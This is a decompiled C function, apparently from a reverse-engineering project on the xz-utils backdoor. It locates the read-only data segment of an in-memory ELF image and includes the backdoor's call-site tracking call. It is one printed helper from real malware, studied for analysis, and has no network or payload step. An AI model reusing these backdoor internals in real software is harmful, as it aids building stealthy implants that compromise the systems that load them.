// /home/kali/xzre-ghidra/xzregh/101F70_elf_get_rodata_segment.c
// Function: elf_get_rodata_segment @ 0x101F70
// Calling convention: __stdcall
// Prototype: void * __stdcall elf_get_rodata_segment(elf_info_t * elf_info, u64 * pSize)


/*
 * AutoDoc: Locates the first read-only PT_LOAD segment that lives entirely after the executable code. It first asks `elf_get_code_segment`
 * for the text range so it can ignore overlapping pages, then scans for PF_R-only segments, page-aligns their bounds, and picks
 * the lowest segment whose start is beyond the end of `.text`. The result is cached in `elf_info_t` and handed to callers
 * alongside its size so later routines (string searches, RELRO probes) can reuse the computed window.
 */

#include "xzre_types.h"

void * elf_get_rodata_segment(elf_info_t *elf_info,u64 *pSize)

{
  Elf64_Ehdr *pEVar1;
  BOOL rodata_segment_found;
  BOOL BVar3;
  void *pvVar4;
  void *pvVar5;
  Elf64_Phdr *pEVar6;
  ulong uVar7;
  void *pvVar8;
  u64 uVar9;
  long lVar10;
  ulong uVar11;
  u64 local_20;
  
  BVar3 = secret_data_append_from_call_site((secret_data_shift_cursor_t)0xbd,0xe,0xb,FALSE);
  if (BVar3 != FALSE) {
    pvVar4 = (void *)elf_info->rodata_segment_start;
    pEVar1 = elf_info->elfbase;
    local_20 = 0;
    if (pvVar4 != (void *)0x0) {
      *pSize = elf_info->rodata_segment_size;
      return pvVar4;
    }
    pvVar4 = elf_get_code_segment(elf_info,&local_20);
    if (pvVar4 != (void *)0x0) {
      rodata_segment_found = FALSE;
      uVar9 = 0;
      pvVar5 = (void *)0x0;
      for (lVar10 = 0; (uint)lVar10 < (uint)(ushort)elf_info->e_phnum; lVar10 = lVar10 + 1) {
        pEVar6 = elf_info->phdrs + lVar10;
        if ((pEVar6->p_type == 1) && ((pEVar6->p_flags & 7) == 4)) {
          uVar7 = (long)pEVar1 + (pEVar6->p_vaddr - elf_info->first_vaddr);
          uVar11 = pEVar6->p_memsz + uVar7;
          pvVar8 = (void *)(uVar7 & 0xfffffffffffff000);
          if ((uVar11 & 0xfff) != 0) {
            uVar11 = (uVar11 & 0xfffffffffffff000) + 0x1000;
          }
          if ((void *)((long)pvVar4 + local_20) <= pvVar8) {
            if (rodata_segment_found) {
              if (pvVar8 < pvVar5) {
                uVar9 = uVar11 - (long)pvVar8;
                pvVar5 = pvVar8;
              }
            }
            else {
              rodata_segment_found = TRUE;
              uVar9 = uVar11 - (long)pvVar8;
              pvVar5 = pvVar8;
            }
          }
        }
      }
      if (rodata_segment_found) {
        elf_info->rodata_segment_start = (u64)pvVar5;
        elf_info->rodata_segment_size = uVar9;
        *pSize = uVar9;
        return pvVar5;
      }
    }
  }
  return (void *)0x0;
}

